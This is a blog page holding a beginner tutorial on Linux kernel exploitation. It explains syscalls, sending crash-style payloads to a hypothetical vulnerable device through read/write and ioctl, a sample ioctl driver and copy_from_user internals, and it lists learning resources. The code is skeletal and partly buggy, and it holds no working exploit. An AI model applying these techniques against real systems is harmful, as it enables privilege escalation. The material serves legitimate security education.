<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Introduction to kernel exploitation :: kernemporium</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="What is kernel exploitation ?! Vulnerable syscalls Kernel exploitation is the exploitation of security flaws in ring 0. The techniques used in order to exploit this kind of vulnerability are a bit different from exploiting a userland application. And when you begin, it can be a bit hard to understand. In ring 0 or in &amp;ldquo;kernel land&amp;rdquo; relies the internals of your operating system. For example a userland application pass execution to kernel land for many purposes, such hardware access or native/privileged features of your operating system:" />
<meta name="keywords" content="RE, pwn, ctf, kernel" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/kernel/intro/" />




<link rel="stylesheet" href="/assets/style.css">






<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="/img/favicon/orange.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Introduction to kernel exploitation">
<meta property="og:description" content="What is kernel exploitation ?! Vulnerable syscalls Kernel exploitation is the exploitation of security flaws in ring 0. The techniques used in order to exploit this kind of vulnerability are a bit different from exploiting a userland application. And when you begin, it can be a bit hard to understand. In ring 0 or in &amp;ldquo;kernel land&amp;rdquo; relies the internals of your operating system. For example a userland application pass execution to kernel land for many purposes, such hardware access or native/privileged features of your operating system:" />
<meta property="og:url" content="/kernel/intro/" />
<meta property="og:site_name" content="kernemporium" />

  
    <meta property="og:image" content="/img/favicon/orange.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2021-03-31 00:00:00 &#43;0000 UTC" />












</head>
<body class="orange">


<div class="container full headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    kernemporium
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/whoami/whoami">about</a></li>
        
      
        
          <li><a href="/heap">heap</a></li>
        
      
        
          <li><a href="/kernel">kernel</a></li>
        
      
      
    

    
    <div class="spacer"></div>
    <ul class="language-selector">
      <ul class="language-selector-current">
          <li>English ▾</li>
      </ul>
      <ul class="language-selector__more hidden">
        
        <li><a href="/">English</a></li>
        
        <li><a href="/fr/">Français</a></li>
        
      </ul>
    </ul>
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/whoami/whoami">about</a></li>
      
    
      
        <li><a href="/heap">heap</a></li>
      
    
      
        <li><a href="/kernel">kernel</a></li>
      
    
    
    <hr />
      
        <li>
          <a href="/">English</a>
        </li>
      
        <li>
          <a href="/fr/">Français</a>
        </li>
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/kernel/intro/">Introduction to kernel exploitation</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2021-03-31 
      </span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/kernel/">kernel</a>&nbsp;
    
    #<a href="/tags/newbie/">newbie</a>&nbsp;
    
    #<a href="/tags/pwn/">pwn</a>&nbsp;
    
    #<a href="/tags/buffer-overflow/">buffer overflow</a>&nbsp;
    
  </span>
  

  

  

  <div class="post-content"><div>
        <h1 id="what-is-kernel-exploitation-">What is kernel exploitation ?!<a href="#what-is-kernel-exploitation-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h4 id="vulnerable-syscalls">Vulnerable syscalls<a href="#vulnerable-syscalls" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Kernel exploitation is the exploitation of security flaws in <a href="https://manybutfinite.com/post/cpu-rings-privilege-and-protection/">ring 0</a>. The techniques used in order to exploit this kind of vulnerability are a bit different from exploiting a userland application. And when you begin, it can be a bit hard to understand. In ring 0 or in &ldquo;kernel land&rdquo; relies the internals of your operating system. For example a userland application pass execution to kernel land for many purposes, such hardware access or native/privileged features of your operating system:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Small x86-64 application in nasm */</span>

global _start

_start:
    xor rdi, rdi ; <span style="color:#75715e">// set rdi to zero
</span><span style="color:#75715e"></span>    mov rax, <span style="color:#ae81ff">60</span> ; <span style="color:#75715e">// syscall number for exit
</span><span style="color:#75715e"></span>    syscall ; <span style="color:#75715e">// &lt;- entry in kernel land for exit(0)
</span></code></pre></div><p>The 60 moved into rax represents the index of a &ldquo;system call&rdquo; in the <a href="https://blog.packagecloud.io/eng/2016/04/05/the-definitive-guide-to-linux-system-calls/">syscall table</a>. The first parameter of the syscall function is passed into rdi according to the <a href="https://uclibc.org/docs/psABI-x86_64.pdf">abi</a> the next parameters are put in the registers : rsi, rdx, r8 and r9. These parameters may be missused and can potentally lead to a vulnerability which can be exploited !!!</p>
<h4 id="vulnerable-devices">Vulnerable devices<a href="#vulnerable-devices" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>As seen previously, you can exploit a vulnerable syscall from userland without problems, but there are also two other kind of kernel land programs which can be used in order to increase your privileges: loadable kernel modules (LKM) and devices. We will not cover the exploitation of LKM which are not registered as a device and which are a bit different to handle. Basically, there is two main techniques which allow you to send data to a device :</p>
<ul>
<li>Open the device and having a file descriptor on the target device, and use the a syscall read / write in order to trigger the function linked as the read / write handler. To trigger a vulnerability in the function which will deal with the read / write actions of our userland program according to the syscall we are using. Basic payload structure for such exploits:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>  
<span style="color:#75715e">#define VULN_DEVICE &#34;/dev/im_vuln&#34; </span><span style="color:#75715e">// vuln name
</span><span style="color:#75715e"></span><span style="color:#75715e">#define LEN_CRASH 64
</span><span style="color:#75715e">#define LEN_READ 256
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(VULN_DEVICE, O_RDWR); <span style="color:#75715e">// Open in write / read
</span><span style="color:#75715e"></span>  
  <span style="color:#66d9ef">char</span> rbuf[LEN_READ];
  
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> malloc(LEN_CRASH);
  
  memset(pld, <span style="color:#ae81ff">0x41</span>, LEN_CRASH);
  
  <span style="color:#75715e">/* Some basic check */</span>
  
  read(fd, rbuf, LEN_READ); <span style="color:#75715e">// Request data from kernel, trigger the read handler
</span><span style="color:#75715e"></span>  
  write(fd, pld, LEN_CRASH); <span style="color:#75715e">// Send data to the kernel, trigger the write handler
</span><span style="color:#75715e"></span>  
  <span style="color:#75715e">/* Theorically if the vuln is triggered, the code below is never reached */</span>
  
  close(fd);
  free(pld);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Sure, this structure depends of the vulnerability which affects your device. Asking for 256 bytes can for example cause a particular behaviour which will make that the call to write just next will be vulnerable.</p>
<ul>
<li>Or you can interact with your device with the <a href="https://embetronicx.com/tutorials/linux/device-drivers/ioctl-tutorial-in-linux/">ioctl</a> syscall. To interact with your device with ioctl you must fill at least the above parameters:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ioctl</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> request, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>arg);

<span style="color:#75715e">/*
</span><span style="color:#75715e">* The fd field represents your open file descriptor on your driver.
</span><span style="color:#75715e">*
</span><span style="color:#75715e">* The requests field represents the command that you want to execute
</span><span style="color:#75715e">* (you will see it deeper in the code).
</span><span style="color:#75715e">*
</span><span style="color:#75715e">* Finally the arg pointer can be any variable, the only mandary thing is that 
</span><span style="color:#75715e">* the kernel code in your device which will handle your argument and your request 
</span><span style="color:#75715e">* according to the type and the value of these variables.
</span><span style="color:#75715e">*/</span>
</code></pre></div><p>And because practicing is more clear let&rsquo;s write a device which will handle the calls to ioctl:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/miscdevice.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define WRITE 2
</span><span style="color:#75715e">#define READ 3
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> file_operations f <span style="color:#f92672">=</span> {
  <span style="color:#75715e">/* ... */</span>
  .unlocked_ioctl <span style="color:#f92672">=</span> vuln_ioctl,
  <span style="color:#75715e">/* vuln_ioctl is registered as the ioctl handler, it will be called at every ioctl request from userland */</span>
};

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ioctl_read {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} read_ioctl;

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>argp);
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>argp);

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">vuln_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> request, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>arg_user){
  <span style="color:#66d9ef">int</span> ret;
  read_ioctl <span style="color:#f92672">*</span>argp <span style="color:#f92672">=</span> (read_ioctl <span style="color:#f92672">*</span>)arg_user;

  <span style="color:#66d9ef">switch</span> (request) {
    <span style="color:#66d9ef">case</span> WRITE:
      ret <span style="color:#f92672">=</span> write(argp);
      <span style="color:#66d9ef">break</span>;
    <span style="color:#66d9ef">case</span> READ:
      ret <span style="color:#f92672">=</span> read(argp);
      <span style="color:#66d9ef">break</span>;
    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
      ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; <span style="color:#75715e">/* Invalid request */</span>
  }

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  So request and argp can be anything according
</span><span style="color:#75715e">  *  to the fact that in your code the value of request
</span><span style="color:#75715e">  *  and argp are correctly handled
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> ret;

}

<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">write</span>(read_ioctl __user <span style="color:#f92672">*</span>argp) {

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Some dangerous stuff with argp
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#75715e">#define LEN_STR 28
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read</span>(read_ioctl __user <span style="color:#f92672">*</span>argp) {
  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  This function will just copy either the argp-&gt;lenth bytes
</span><span style="color:#75715e">  *  of kstr in argp-&gt;rbuf or if argp-&gt;length &gt; LEN_STR, it will
</span><span style="color:#75715e">  *  just copy all the string in order to prevent bugs.
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kstr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;I&#39;m a string in kernel land&#34;</span>;

  <span style="color:#66d9ef">if</span> (argp<span style="color:#f92672">-&gt;</span>length <span style="color:#f92672">&gt;=</span> LEN_STR) {
      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> copy_to_user(argp<span style="color:#f92672">-&gt;</span>rbuf, kstr, LEN_STR)) {
        printk(KERN_INFO <span style="color:#e6db74">&#34;[ERROR READ]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
      }

      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
  }

  <span style="color:#75715e">/* If the code below is reached, argp-&gt;length &lt; LEN_STR */</span>

  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> copy_to_user(argp<span style="color:#f92672">-&gt;</span>rbuf, kstr, argp<span style="color:#f92672">-&gt;</span>length)) {
    printk(KERN_INFO <span style="color:#e6db74">&#34;[ERROR READ]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

  <span style="color:#75715e">/* ... */</span>
</code></pre></div><p>Typically, if we want to read / send data from / to a device which is handling our ioctl requests we have to build a structure like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* 
</span><span style="color:#75715e">*  We are just taking the same code that previously
</span><span style="color:#75715e">*  but we send data with ioctl
</span><span style="color:#75715e">*/</span>

<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdarg.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define VULN_DEVICE &#34;/dev/im_vuln&#34;
</span><span style="color:#75715e">#define LEN_CRASH 64
</span><span style="color:#75715e">#define LEN_READ 256
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define WRITE 2
</span><span style="color:#75715e">#define READ 3
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/* Same request than the code in kernel land */</span>

<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> ioctl_read {
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> length;
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rbuf;
} read_ioctl;

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
  <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(VULN_DEVICE, O_RDWR); <span style="color:#75715e">/* Open in write / read */</span>

  read_ioctl r_arg <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};

  r_arg.rbuf <span style="color:#f92672">=</span> malloc(LEN_READ);

  read_ioctl.length <span style="color:#f92672">=</span> LEN_READ;
  memset(read_ioctl.rbuf, <span style="color:#ae81ff">0x0</span>, LEN_READ);

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>pld <span style="color:#f92672">=</span> malloc(LEN_CRASH);

  memset(pld, <span style="color:#ae81ff">0x41</span>, LEN_CRASH);

  ioctl(fd, READ, <span style="color:#f92672">&amp;</span>r_arg);

  <span style="color:#75715e">/*
</span><span style="color:#75715e">  *  We send a READ request which will be interpreted as 
</span><span style="color:#75715e">  *  seen above. And then, the read_ioctl-&gt;length-n bytes 
</span><span style="color:#75715e">  *  will be copied in read_ioctl-&gt;rbuf.
</span><span style="color:#75715e">  */</span>

  ioctl(fd, WRITE, pld);

  <span style="color:#75715e">/* 
</span><span style="color:#75715e">  *  Same thing that for READ, the WRITE request is 
</span><span style="color:#75715e">  *  handled by in our example the write handler.
</span><span style="color:#75715e">  */</span> 

  close(fd);
  free(read_ioctl.rbuf);
  free(pld);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>Of course, the goal of this part is not to explain how devices are developed and only a few concepts are mandatory for sending our payloads in kernel land. So if you are interested in linux kernel developpement and if you want to learn more about linux kernel exploit developpement, you can look at this bunch of links below:</p>
<ul>
<li>
<p><a href="https://doc.lagout.org/operating%20system%20/linux/Understanding%20Linux%20Kernel.pdf">Understanding linux kernel</a>, one of the most important book about the the linux internals especially for memory management and process structure. But be careful, this book covers the 2.x.x linux kernel and is so a bit old.</p>
</li>
<li>
<p><a href="https://www.doc-developpement-durable.org/file/Projets-informatiques/cours-&amp;-manuels-informatiques/Linux/Linux%20Kernel%20Development,%203rd%20Edition.pdf">Linux kernel developpement</a>, a book focused on KLM developement very interesting for the beginners and is a bit more recent that the last one.</p>
</li>
<li>
<p><a href="https://pdos.csail.mit.edu/~sbw/links/gorman_book.pdf">Understanding the Linux Virtual Memory Manager</a>, a book about the functioning of the linux virtual memory allocator. But be careful he is a bit more advanced. There is too some stuff with dynamic memory allocators (slab / slub / slob).</p>
</li>
<li>
<p><a href="https://index-of.es/Exploit/Attacking%20the%20core.pdf">A Guide to Kernel Exploitation Attacking the Core</a>, a reference book kernel exploitation for beginners I guess that it&rsquo;s one of the most important resource for learning kernel exploitation. Unfortunately, he is quite old and today the exploitation techniques have changed but for kernel below that 4.x.x, it stay a bit the same thing.</p>
</li>
<li>
<p><a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf">Paper about ret2dir attacks</a>, very interesting paper about how to exploit your kernel with re2dir attack.</p>
</li>
<li>
<p><a href="https://lira.epac.to/DOCS-TECH/Hacking/Reverse%20Engineering%20for%20Beginners.pdf">Reverse Engineering 4 Beginners</a>, if you are not familiar with intel assembly programming and that you don&rsquo;t know anything about Reverse Engineering it&rsquo;s important for be ready to begin kernel exploitation that you know a few basics knowledge about it.</p>
</li>
<li>
<p><a href="http://phrack.org/issues/64/6.html">phrack Kernel Exploitation notes</a>, a few interested notes from phrack about kernel exploitation and is a good overview of the different kind of vulnerabilities that you can find in kernel land and how to exploit them.</p>
</li>
<li>
<p>CVE-2017-11176 A step-by-step Linux Kernel exploitation by lexfo security (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">1</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html">2</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">3</a>, <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html">4</a>), very big resource for learning kernel exploitation, these 4 parts are too a good entry point in kernel exploitation.</p>
</li>
<li>
<p><a href="https://cse.yeditepe.edu.tr/~kserdaroglu/spring2014/cse331/termproject/BOOKS/ProfessionalLinuxKernelArchitecture-WolfgangMauerer.pdf">Professional Linux Kernel Architecture</a>, important book on linux kernel internals. He looks like Understanding linux kernel but is a bit more advanced on certain chapters.</p>
</li>
</ul>
<p>Now that you have learned how send data to your device we will see a few vulnerabilities which can affects your device and any syscall in kernel land.</p>
<h2 id="vulnerabilities">Vulnerabilities<a href="#vulnerabilities" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Because this page is only an introduction made only in order to give you a very basic knowledge about kernel exploitation. A next part will be related to each kind vulnerability, and will go deeper in the explainaition of the exploitation techniques.</p>
<h4 id="stack-buffer-overflows">Stack Buffer Overflows<a href="#stack-buffer-overflows" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>A stack buffer overflow is a very common vulnerability that you have already seen in userland programs ( if you don&rsquo;t know anything about it I think that beginning kernel exploitation is not very safe and you should more take a look at ropemporium ). In Kernel-land, a stack overflow appears as in Userland when you try to write in a buffer which you have allocated N bytes more than N and that so you can overwrite the saved instruction pointer. We will not go deeper in the explainaition of this kind of bugs but we will see how you can trigger the vulnerability and then exploit her.</p>
<p>Typically, a stack buffer overflow is often the result of functions such strcpy() / memcpy() in userland or directly dangerous loops. For example, the kernel function used to copy a buffer from userland to kernel land is often <code>copy_from_user((void *to, const __user *from, unsigned long n);</code>, let&rsquo;s dig more in the internals of this function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">copy_from_user</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n);

<span style="color:#75715e">/* void *to is a Kernel land buffer to whom n bytes from the  
</span><span style="color:#75715e">*  const __user *from userland buffer will be copied.
</span><span style="color:#75715e">*  Note: The copy_from_user function checks the arguments in order to prevent 
</span><span style="color:#75715e">*  overflows as we can see below. 
</span><span style="color:#75715e">*/</span>

<span style="color:#66d9ef">static</span> __always_inline <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> __must_check
<span style="color:#a6e22e">copy_from_user</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
  <span style="color:#66d9ef">if</span> (likely(check_copy_size(to, n, false)))
    n <span style="color:#f92672">=</span> _copy_from_user(to, from, n);
  <span style="color:#66d9ef">return</span> n;
}

<span style="color:#75715e">/* The check_copy_size(to, n, false) looks like it */</span>

<span style="color:#66d9ef">static</span> __always_inline __must_check <span style="color:#66d9ef">bool</span>
<span style="color:#a6e22e">check_copy_size</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t bytes, <span style="color:#66d9ef">bool</span> is_source)
{
  <span style="color:#66d9ef">int</span> sz <span style="color:#f92672">=</span> __compiletime_object_size(addr);

  <span style="color:#75715e">/* __compiletime_object_size(addr) returns the length of the object 
</span><span style="color:#75715e">  *  pointed by addr (addr can whatever in the object), it&#39;s possible 
</span><span style="color:#75715e">  *  if only for objects whose ranges can be determinated at 
</span><span style="color:#75715e">  *  compile time.
</span><span style="color:#75715e">  */</span>
  <span style="color:#66d9ef">if</span> (unlikely(sz <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> sz <span style="color:#f92672">&lt;</span> bytes)) {
    <span style="color:#75715e">/* n &gt; Our buffer -&gt; Overflow */</span>
  }
  <span style="color:#66d9ef">if</span> (WARN_ON_ONCE(bytes <span style="color:#f92672">&gt;</span> INT_MAX))
    <span style="color:#75715e">/*Max value for an int -&gt; crazy behaviour -&gt; error*/</span>
    <span style="color:#66d9ef">return</span> false;

  check_object_size(addr, bytes, is_source);
  
  <span style="color:#75715e">/* The check_object_size will try to determine if the object is a valid
</span><span style="color:#75715e">  *  object in the stack/heap and if addr + bytes stays in the stack frame.
</span><span style="color:#75715e">  *  According to the fact that for example if (addr + bytes) 
</span><span style="color:#75715e">  *  &gt; stackend, check_copy_size will abort the copy or return.
</span><span style="color:#75715e">  */</span>

  <span style="color:#66d9ef">return</span> true;
}

<span style="color:#75715e">/* Now take a look at _copy_from_user(to, from, n);
</span><span style="color:#75715e">*  
</span><span style="color:#75715e">*/</span> 

_copy_from_user(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> __user <span style="color:#f92672">*</span>from, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> n)
{
  <span style="color:#75715e">/* likely() and unlikely() are just macros 
</span><span style="color:#75715e">  *  who are saying to the cpu:
</span><span style="color:#75715e">  *  - if(likely(condition)) { This code 
</span><span style="color:#75715e">  *  is basically executed there is not
</span><span style="color:#75715e">  *  conditional jmp toward another memory
</span><span style="color:#75715e">  *  page which is potentially not in the cache
</span><span style="color:#75715e">  *  and which will make that the execution will
</span><span style="color:#75715e">  *  be slower}
</span><span style="color:#75715e">  *  - In opposition to likely(condition), unlikely(condition)
</span><span style="color:#75715e">  *  will make that:
</span><span style="color:#75715e">  *  
</span><span style="color:#75715e">  *  if(unlikely(!func(0x1337))) {
</span><span style="color:#75715e">  *      return 0;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  * 
</span><span style="color:#75715e">  *  else { 
</span><span style="color:#75715e">  *    return 1337;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  At runtime it&#39;s equivalent to:
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *  if(func(0x1337)){
</span><span style="color:#75715e">  *  /* In assembly it looks like it:
</span><span style="color:#75715e">  *  *  call func
</span><span style="color:#75715e">  *  *  cmp rax, 0x0
</span><span style="color:#75715e">  *  *  je so_far_else
</span><span style="color:#75715e">  *  *  mov rax, 1337
</span><span style="color:#75715e">  *  *  ret
</span><span style="color:#75715e">  *  * 
</span><span style="color:#75715e">  *  *  In assembly we can see that when the unlikely condition
</span><span style="color:#75715e">  *  *  is true, the execution is a bit slower because the address
</span><span style="color:#75715e">  *  *  of else can be in another page not in the TLB 
</span><span style="color:#75715e">  *  *  (translation lookaside buffer). It&#39;s too used by the branch prediction
</span><span style="color:#75715e">  *  *  feature of you processor for know if it must evaluate the jmp.
</span><span style="color:#75715e">  *  *
</span><span style="color:#75715e">  *  /
</span><span style="color:#75715e">  *    return 1337; 
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *  else { 
</span><span style="color:#75715e">  *  /* This label can be in another page
</span><span style="color:#75715e">  *  *  the jmp here is &#39;unlikely&#39; and is a 
</span><span style="color:#75715e">  *  *  bit more slow.
</span><span style="color:#75715e">  *  /
</span><span style="color:#75715e">  *    return 0;
</span><span style="color:#75715e">  *  }
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  *
</span><span style="color:#75715e">  */</span> 

  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> res <span style="color:#f92672">=</span> n;
  might_fault();
  <span style="color:#66d9ef">if</span> (likely(access_ok(from, n))) {
    <span style="color:#75715e">/* does we can access n bytes from from ? */</span>
    kasan_check_write(to, n);
    <span style="color:#75715e">/* does we can write n bytes to to ? */</span>

    <span style="color:#75715e">/* All check have been done 
</span><span style="color:#75715e">    *  We can call the final function.
</span><span style="color:#75715e">    */</span>

    res <span style="color:#f92672">=</span> raw_copy_from_user(to, from, n); 
  }  
  
  <span style="color:#75715e">/* When res is equal to zero the data has been copied, else 
</span><span style="color:#75715e">  *  it&#39;s that the previous condition is not taken and so res = number
</span><span style="color:#75715e">  *  of bytes to copy.
</span><span style="color:#75715e">  */</span>

